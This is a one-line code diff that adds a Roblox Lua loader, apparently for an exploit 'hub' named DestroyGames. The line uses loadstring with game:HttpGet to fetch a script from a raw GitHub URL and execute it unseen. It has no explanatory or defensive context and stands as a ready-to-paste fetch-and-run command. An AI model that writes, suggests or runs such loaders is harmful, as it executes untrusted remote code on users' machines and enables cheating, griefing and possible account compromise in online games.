@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hi822010/DestroyGames/main/DestroyGames%20Hub"))();
